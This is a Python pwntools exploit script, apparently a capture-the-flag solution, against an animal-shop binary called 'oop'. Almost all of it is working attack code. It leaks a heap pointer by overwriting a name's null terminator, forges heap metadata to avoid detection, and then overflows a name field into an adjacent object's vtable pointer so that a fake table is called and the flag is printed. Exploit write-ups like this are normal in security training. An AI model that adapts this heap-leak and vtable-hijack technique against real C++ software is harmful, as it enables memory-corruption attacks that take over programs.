#!/usr/bin/python3

from pwn import *

e = ELF("src/oop")
if args.REMOTE:
    r = remote(args.HOST, int(args.PORT))
else:
    r = process(e.path)

context.arch = "amd64"

FAKE_TABLE = 0x1295edc-0x1283000

def list_animals():
    r.recvuntil(b'> ')
    r.sendline(b'1')
    return r.recvuntil(b'!')


def animal_action(index):
    r.recvuntil(b'> ')
    r.sendline(b'2')

    r.recvuntil(b'? ')
    r.sendline(str(index).encode())


def buy_animal(type, name):
    r.recvuntil(b'> ')
    r.sendline(b'3')

    r.recvuntil(b'> ')
    r.sendline(str(type).encode())

    r.recvuntil(b'? ')
    r.sendline(name)


def buy_translator():
    r.recvuntil(b'> ')
    r.sendline(b'4')


def sell(index):
    animal_action(index)
    r.recvuntil(b'> ')
    r.sendline(str(1).encode())


def feed(index):
    animal_action(index)
    r.recvuntil(b'> ')
    r.sendline(str(2).encode())


def rename(index, name):
    animal_action(index)
    r.recvuntil(b'> ')
    r.sendline(b"3")

    r.recvuntil(b'? ')
    r.sendline(name)


# We will first create two animals, and free the second.
# By removing the null bytes following the name of the
# first, we can puts() all the way up to the heap pointer,
# allowing is to obtain heap base

log.info("Creating evil pig")
buy_animal(1, b"EvilPig")
# Place a heap pointer just after the first animal
log.info("Creating pig for slaughter...")
buy_animal(1, b"DummyPig")
# Build up money...
list_animals()
sell(1)
# Replace all null bytes with 'A'
log.info("Enlarging evil pig...")
rename(0, b"A" * 44)

# Printing the name will now include the heap pointer
# from DummyPig
leak = list_animals()
print(hexdump(leak[0x2f:0x2f+4]))
heap_base = u64(leak[0x2f:0x2f+4].ljust(8, b'\x00')) & ~0xff
log.success(f"Heap Base: {hex(heap_base)}")
sell(0)
# Put some fake metadata back in so
# we don't trigger heap check
log.info("Creating false pig...")
buy_animal(1, b"DDDD" + p64(64)*7)
log.info("Creating money pig...")
buy_animal(1, b"Money2")
# Earn some more money so we have room for what's next
sell(0)
sell(1)

# We will now create two animals adjacent on the heap.
# The name field of the later one should contain
# pointers to Animal::Translate. The earlier one will have
# its name overflown into the vtable pointer of the second


log.info("Creating table pig...")
buy_animal(1, p64(e.sym['_ZN6Animal9TranslateEv']) * 2)
log.info("Creating long pig...")
buy_animal(1, b"L" + b"O"*0x21 + b"NG" + p64(heap_base + FAKE_TABLE) + b"flag\x00")
print(r.recvuntil(b'}', timeout=3).decode())
